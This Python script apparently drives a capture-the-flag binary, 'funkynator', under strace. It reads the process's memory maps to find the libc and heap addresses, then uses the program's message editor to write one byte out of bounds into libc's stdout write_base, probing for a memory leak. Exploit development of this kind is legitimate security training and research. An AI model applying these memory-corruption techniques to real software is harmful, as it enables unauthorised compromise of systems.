#!/usr/bin/env python3
"""Simple test using subprocess + strace."""
import subprocess, os, struct, time, signal, fcntl
from pathlib import Path

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = str(CHALLENGE_DIR.resolve() / 'glibc')

proc = subprocess.Popen(
    ['strace', '-f', '-e', 'trace=read,write', '-o', '/tmp/strace.out', BINARY],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    cwd=str(CHALLENGE_DIR), env=env
)

def recv_until(pipe, marker, timeout=5):
    data = b''
    start = time.time()
    flags = fcntl.fcntl(pipe, fcntl.F_GETFL)
    while time.time() - start < timeout:
        try:
            r = os.read(pipe.fileno(), 65536)
            if not r:
                break
            data += r
            if marker in data:
                return data
        except BlockingIOError:
            time.sleep(0.1)
    fcntl.fcntl(pipe, fcntl.F_SETFL, flags)
    return data

def send(s):
    proc.stdin.write(s if isinstance(s, bytes) else s.encode())
    proc.stdin.flush()

# Set stdout to non-blocking
fcntl.fcntl(proc.stdout, fcntl.F_SETFL, fcntl.fcntl(proc.stdout, fcntl.F_GETFL) | os.O_NONBLOCK)
fcntl.fcntl(proc.stderr, fcntl.F_SETFL, fcntl.fcntl(proc.stderr, fcntl.F_GETFL) | os.O_NONBLOCK)

def read_all(pipe, timeout=0.5):
    data = b''
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = os.read(pipe.fileno(), 65536)
            if not r: break
            data += r
        except BlockingIOError:
            time.sleep(0.05)
    return data

# Consume intro
data = recv_until(proc.stdout, b'name?')
assert data, "Didn't get intro"
send(b'TEST\n')
data = recv_until(proc.stdout, b'> ')

# Create msg1
send(b'2\n'); recv_until(proc.stdout, b'length\n')
send(b'5\n'); recv_until(proc.stdout, b'message:\n')
send(b'AAAAA\n'); recv_until(proc.stdout, b'?\n')
send(b'n\n'); recv_until(proc.stdout, b'?\n')
send(b'y\n'); recv_until(proc.stdout, b'> ')

# Create msg2
send(b'2\n'); recv_until(proc.stdout, b'length\n')
send(b'10\n'); recv_until(proc.stdout, b'message:\n')
send(b'BBBBBBBBBB\n'); recv_until(proc.stdout, b'?\n')
send(b'n\n'); recv_until(proc.stdout, b'?\n')
send(b'y\n'); recv_until(proc.stdout, b'> ')

# Get addresses
maps = open(f'/proc/{proc.pid}/maps').read()
binary = libc = None
for l in maps.split('\n'):
    parts = l.strip().split()
    if len(parts) < 5: continue
    if 'funkynator' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        binary = int(parts[0].split('-')[0], 16)
    if 'libc.so.6' in parts[-1] and parts[1] == 'r--p' and parts[2] == '00000000':
        libc = int(parts[0].split('-')[0], 16)
        break

with open(f'/proc/{proc.pid}/mem', 'rb') as f:
    f.seek(binary + 0x4060)
    arr = f.read(16)
    msg2 = struct.unpack('<Q', arr[8:16])[0]

STDOUT = 0x1e85c0; WB_OFF = 0x20
with open(f'/proc/{proc.pid}/mem', 'rb') as f:
    f.seek(libc + STDOUT + WB_OFF)
    orig_wb = struct.unpack('<Q', f.read(8))[0]

orig_byte1 = (orig_wb >> 8) & 0xFF
new_byte1 = (orig_byte1 - 2) & 0xFF
wb_byte1_addr = libc + STDOUT + WB_OFF + 1
off = (wb_byte1_addr - msg2) & 0xFFFFFFFFFFFFFFFF

print(f"libc={libc:#x} msg2={msg2:#x} off={off:#x}")
print(f"orig_wb={orig_wb:#x} byte1={orig_byte1:#04x}->{new_byte1:#04x}")

# Enter editor
send(b'5\n'); recv_until(proc.stdout, b'id\n')
send(b'2\n'); recv_until(proc.stdout, b'> ')

# Overwrite byte 1 of write_base
send(b'3\n'); recv_until(proc.stdout, b'offset\n')
send(f'{off}\n'.encode()); recv_until(proc.stdout, b'value?\n')
send(bytes([new_byte1]) + b'\n')

# Wait and see what comes back after the overwrite
time.sleep(0.5)
data = read_all(proc.stdout, 2)
print(f"\nAfter overwrite: got {len(data)} bytes")
if data:
    print(f"Hex: {data[:200].hex()}")
    print(f"Raw: {data[:200]}")

# Try to exit and see more
send(b'1\n')
time.sleep(0.5)
data2 = read_all(proc.stdout, 3)
print(f"\nAfter exit: got {len(data2)} bytes")
if data2:
    print(f"Hex: {data2[:200].hex()}")
    print(f"Raw: {data2[:200]}")

# Check strace
time.sleep(0.3)
print("\n=== STRACE (last 20 lines) ===")
strace = open('/tmp/strace.out').read()
for l in strace.split('\n')[-20:]:
    print(l)

proc.terminate()
